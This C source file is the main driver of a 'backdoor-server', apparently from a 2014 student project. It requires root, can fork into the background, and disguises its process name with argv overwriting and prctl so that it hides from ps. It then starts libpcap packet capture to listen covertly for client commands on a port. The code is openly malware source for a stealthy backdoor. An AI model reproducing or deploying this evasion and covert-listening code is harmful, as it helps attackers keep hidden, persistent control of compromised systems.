#include "backdoor-server.h"

/*--------------------------------------------------------------------------------------------------------------------
-- FUNCTION: main
-- 
-- DATE: 2014/09/06
-- 
-- REVISIONS: (Date and Description)
-- 
-- DESIGNER: Luke Tao, Ian Lee
-- 
-- PROGRAMMER: Luke Tao, Ian Lee
-- 
-- INTERFACE: int main(int argc, char **argv)
-- 
-- RETURNS: 0
-- 
-- NOTES: main driver function
----------------------------------------------------------------------------------------------------------------------*/
int main(int argc, char **argv)
{
	user_options.daemon_mode = FALSE;
	user_options.port = DEFAULT_PORT;

	/* Check to see if user is root */
	if (geteuid() != USER_ROOT)
	{
		printf("\nYou need to be root to run this.\n\n");
		exit(-1);
	}
	if(parse_options(argc, argv) < 0)
		exit(-1);
	if(start_daemon() >0){
		printf("Daemon started");
		exit(0);
	}
	print_server_info();

	mask_process(argv);

	start_server();

	return 0;
}

/*--------------------------------------------------------------------------------------------------------------------
-- FUNCTION: start_server
-- 
-- DATE: 2014/09/06
-- 
-- REVISIONS: (Date and Description)
-- 
-- DESIGNER: Luke Tao, Ian Lee
-- 
-- PROGRAMMER: Luke Tao, Ian Lee
-- 
-- INTERFACE: int start_server()
-- 
-- RETURNS: 0
-- 
-- NOTES: Starts packet capturing function as server
----------------------------------------------------------------------------------------------------------------------*/
int start_server()
{
	pcap_t * nic_handle = NULL;
	struct bpf_program fp;

	startPacketCapture(nic_handle, fp, FROM_CLIENT, NULL, user_options.port);
	stopPacketCapture(nic_handle, fp);

	return 0;
}
/*--------------------------------------------------------------------------------------------------------------------
-- FUNCTION: parse_options
-- 
-- DATE: 2014/09/06
-- 
-- REVISIONS: (Date and Description)
-- 
-- DESIGNER: Luke Tao, Ian Lee
-- 
-- PROGRAMMER: Luke Tao, Ian Lee
-- 
-- INTERFACE: int parse_options(int argc, char **argv)
-- 
-- RETURNS: 0 for it worked, -1 for error
-- 
-- NOTES: Grabs command line arguments to use as values.
----------------------------------------------------------------------------------------------------------------------*/
int parse_options(int argc, char **argv)
{
	char c;
	while ((c = getopt (argc, argv, "dp:")) != -1)
	{
		switch (c)
		{
			case 'd':
				user_options.daemon_mode = TRUE;
				break;
			case 'p':
				user_options.port = atoi(optarg);
				break;
			case '?':
			default:
				usage(argv[0], SERVER_MODE);
				return -1;
		}
	}
	return 0;
}
/*--------------------------------------------------------------------------------------------------------------------
-- FUNCTION: mask_process
-- 
-- DATE: 2014/09/06
-- 
-- REVISIONS: (Date and Description)
-- 
-- DESIGNER: Luke Tao, Ian Lee
-- 
-- PROGRAMMER: Luke Tao, Ian Lee
-- 
-- INTERFACE: void mask_process(char **argv)
-- 
-- RETURNS: void
-- 
-- NOTES: renames process so it can hide from ps
----------------------------------------------------------------------------------------------------------------------*/
void mask_process(char **argv)
{
	memset(argv[0], 0, strlen(argv[0]));
	strcpy(argv[0], MASK_NAME);
	prctl(PR_SET_NAME, MASK_NAME, 0, 0);
}
int start_daemon(){
	if(user_options.daemon_mode==TRUE){
		return 0;
	}
	pid_t result;
	result = fork();
	if(result>0){
		//parent
		return 1;
	} else {
		//child
		return 0;
	}
}
/*--------------------------------------------------------------------------------------------------------------------
-- FUNCTION: print_server_info
-- 
-- DATE: 2014/09/06
-- 
-- REVISIONS: (Date and Description)
-- 
-- DESIGNER: Luke Tao, Ian Lee
-- 
-- PROGRAMMER: Luke Tao, Ian Lee
-- 
-- INTERFACE: void print_server_info()
-- 
-- RETURNS: void
-- 
-- NOTES: Prints out information on server variables
----------------------------------------------------------------------------------------------------------------------*/
void print_server_info()
{
	fprintf(stderr, "Daemon mode %s.\n", user_options.daemon_mode ? "enabled" : "disabled");
	fprintf(stderr, "Process name masked as: %s\n", MASK_NAME);
}
